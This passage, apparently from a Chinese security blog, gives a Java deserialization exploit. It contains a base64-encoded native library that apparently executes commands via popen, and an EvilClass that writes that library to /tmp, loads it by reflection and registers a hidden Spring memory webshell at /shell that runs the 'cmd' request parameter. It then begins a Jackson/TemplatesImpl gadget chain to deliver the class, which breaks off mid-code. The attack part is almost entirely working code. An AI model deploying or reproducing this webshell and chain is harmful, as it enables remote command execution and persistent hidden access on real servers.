AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwEQAAAAAAALARAAAAAAAAAQAAAAAAAACqAAAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAALQUAAAAAAAAGQAAAAAAAAAQPgAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAABg+AAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAA8AIAAAAAAAAFAAAAAAAAAGgEAAAAAAAABgAAAAAAAAAYAwAAAAAAAAoAAAAAAAAAygAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAAAAQAAAAAAAAAIAAAAAAAAAwAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAAAoBgAAAAAAAAcAAAAAAAAAgAUAAAAAAAAIAAAAAAAAAKgAAAAAAAAACQAAAAAAAAAYAAAAAAAAAP7//28AAAAAUAUAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAAAyBQAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAID4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAMBAAAAAAAABAEAAAAAAAAFAQAAAAAAAAYBAAAAAAAABwEAAAAAAAAIAQAAAAAAAAkBAAAAAAAACgEAAAAAAAAFhAAAAAAAAAR0NDOiAoVWJ1bnR1IDExLjQuMC0xdWJ1bnR1MX4yMi4wNCkgMTEuNC4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAIADgBAEQAAAAAAAAAAAAAAAAAADgAAAAIADgBwEQAAAAAAAAAAAAAAAAAAIQAAAAIADgCwEQAAAAAAAAAAAAAAAAAANwAAAAEAGQBgQAAAAAAAAAEAAAAAAAAAQwAAAAEAFAAYPgAAAAAAAAAAAAAAAAAAagAAAAIADgDwEQAAAAAAAAAAAAAAAAAAdgAAAAEAEwAQPgAAAAAAAAAAAAAAAAAAlQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAnAAAAAEAEgDoIAAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAqgAAAAIADwC0FAAAAAAAAAAAAAAAAAAAsAAAAAEAGABYQAAAAAAAAAAAAAAAAAAAvQAAAAEAFQAgPgAAAAAAAAAAAAAAAAAAxgAAAAAAEQAEIAAAAAAAAAAAAAAAAAAA2QAAAAEAGABgQAAAAAAAAAAAAAAAAAAA5QAAAAEAFwAAQAAAAAAAAAAAAAAAAAAA+wAAAAIACgAAEAAAAAAAAAAAAAAAAAAAAQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAHQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAOAEAABIAAAAAAAAAAAAAAAAAAAAAAAAASwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAXgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAgQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkAEAABIADgD5EQAAAAAAAPQAAAAAAAAAlwEAABIADgDtEgAAAAAAAMUBAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwAEAABIAAAAAAAAAAAAAAAAAAAAAAAAA0wEAACAAAAAAAAAAAAAAAAAAAAAAAAAA7QEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC4wAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBFdmlsLmMAX19GUkFNRV9FTkRfXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfaW5pdABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX19zdGFja19jaGtfZmFpbEBHTElCQ18yLjQAcGNsb3NlQEdMSUJDXzIuMi41AG1lbXNldEBHTElCQ18yLjIuNQBmZ2V0c0BHTElCQ18yLjIuNQBmZW9mQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAGV4ZWNtZABKYXZhX0V2aWxDbGFzc19leGVjQ21kAHBvcGVuQEdMSUJDXzIuMi41AHN0cmNhdEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5wcm9wZXJ0eQAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAucGx0LnNlYwAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5keW5hbWljAC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACoAgAAAAAAAKgCAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAuAAAABwAAAAIAAAAAAAAAyAIAAAAAAADIAgAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAQQAAAPb//28CAAAAAAAAAPACAAAAAAAA8AIAAAAAAAAoAAAAAAAAAAQAAAAAAAAACAAAAAAAAAAAAAAAAAAAAEsAAAALAAAAAgAAAAAAAAAYAwAAAAAAABgDAAAAAAAAUAEAAAAAAAAFAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABTAAAAAwAAAAIAAAAAAAAAaAQAAAAAAABoBAAAAAAAAMoAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAWwAAAP///28CAAAAAAAAADIFAAAAAAAAMgUAAAAAAAAcAAAAAAAAAAQAAAAAAAAAAgAAAAAAAAACAAAAAAAAAGgAAAD+//9vAgAAAAAAAABQBQAAAAAAAFAFAAAAAAAAMAAAAAAAAAAFAAAAAQAAAAgAAAAAAAAAAAAAAAAAAAB3AAAABAAAAAIAAAAAAAAAgAUAAAAAAACABQAAAAAAAKgAAAAAAAAABAAAAAAAAAAIAAAAAAAAABgAAAAAAAAAgQAAAAQAAABCAAAAAAAAACgGAAAAAAAAKAYAAAAAAADAAAAAAAAAAAQAAAAXAAAACAAAAAAAAAAYAAAAAAAAAIsAAAABAAAABgAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAGwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACGAAAAAQAAAAYAAAAAAAAAIBAAAAAAAAAgEAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAkQAAAAEAAAAGAAAAAAAAALAQAAAAAAAAsBAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJoAAAABAAAABgAAAAAAAADAEAAAAAAAAMAQAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACjAAAAAQAAAAYAAAAAAAAAQBEAAAAAAABAEQAAAAAAAHIDAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAAGAAAAAAAAALQUAAAAAAAAtBQAAAAAAAANAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAK8AAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAC3AAAAAQAAAAIAAAAAAAAABCAAAAAAAAAEIAAAAAAAADQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAxQAAAAEAAAACAAAAAAAAADggAAAAAAAAOCAAAAAAAAC0AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAM8AAAAOAAAAAwAAAAAAAAAQPgAAAAAAABAuAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADbAAAADwAAAAMAAAAAAAAAGD4AAAAAAAAYLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA5wAAAAYAAAADAAAAAAAAACA+AAAAAAAAIC4AAAAAAADAAQAAAAAAAAUAAAAAAAAACAAAAAAAAAAQAAAAAAAAAJUAAAABAAAAAwAAAAAAAADgPwAAAAAAAOAvAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADwAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAAFgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA+QAAAAEAAAADAAAAAAAAAFhAAAAAAAAAWDAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAP8AAAAIAAAAAwAAAAAAAABgQAAAAAAAAGAwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAEAQAAAQAAADAAAAAAAAAAAAAAAAAAAABgMAAAAAAAACsAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAkDAAAAAAAAAYAwAAAAAAABwAAAAUAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAKgzAAAAAAAACAIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACwNQAAAAAAAA0BAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LIB_PATH <span class="token operator">=</span> <span class="token string">"/tmp/libcmd.so"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">static</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> jniBytes <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>EVIL_JNI_BASE64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            RandomAccessFile randomAccessFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RandomAccessFile</span><span class="token punctuation">(</span>LIB_PATH<span class="token punctuation">,</span> <span class="token string">"rw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            randomAccessFile<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>jniBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            randomAccessFile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token comment" spellcheck="true">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span>
+            ClassLoader cmdLoader <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> classLoaderClazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nativeLibraryClazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader$NativeLibrary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Method load <span class="token operator">=</span> nativeLibraryClazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            load<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Field field <span class="token operator">=</span> classLoaderClazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"nativeLibraries"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Vector<span class="token operator">&lt;</span>Object<span class="token operator">></span> libs <span class="token operator">=</span> <span class="token punctuation">(</span>Vector<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cmdLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nativeLibraryCons <span class="token operator">=</span> nativeLibraryClazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            nativeLibraryCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Object nativeLibraryObj <span class="token operator">=</span> nativeLibraryCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> LIB_PATH<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            libs<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>nativeLibraryObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>cmdLoader<span class="token punctuation">,</span> libs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            load<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>nativeLibraryObj<span class="token punctuation">,</span> LIB_PATH<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            WebApplicationContext context <span class="token operator">=</span> <span class="token punctuation">(</span>WebApplicationContext<span class="token punctuation">)</span> RequestContextHolder<span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            RequestMappingHandlerMapping mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RequestMappingHandlerMapping<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Field configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration config <span class="token operator">=</span>
+                    <span class="token punctuation">(</span>RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration<span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Method method2 <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> HttpServletRequest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> HttpServletResponse<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            RequestMappingInfo info <span class="token operator">=</span> RequestMappingInfo<span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>
+                    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            EvilClass springControllerMemShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springControllerMemShell<span class="token punctuation">,</span> method2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> hi<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            hi<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+
+        String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            String execRes <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token function">execCmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>execRes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>EVIL_JNI_BASE64是动态链接库的base64的值（dll文件或者so文件）</p>
+<p>LIB_PATH是写在远程环境中的地址</p>
+<p>把上面的EvilClass类编译成class文件，利用链子打</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Poc0</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+
+<span class="token comment" spellcheck="true">//        ClassPool pool = ClassPool.getDefault();</span>
+<span class="token comment" spellcheck="true">//        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");</span>
+<span class="token comment" spellcheck="true">//        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");</span>
+<span class="token comment" spellcheck="true">//        ctClass0.removeMethod(writeReplace);</span>
+<span class="token comment" spellcheck="true">//        ctClass0.toClass();</span>
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\HP\\IdeaProjects\\JavaChains\\target\\classes\\EvilClass.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Templates templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
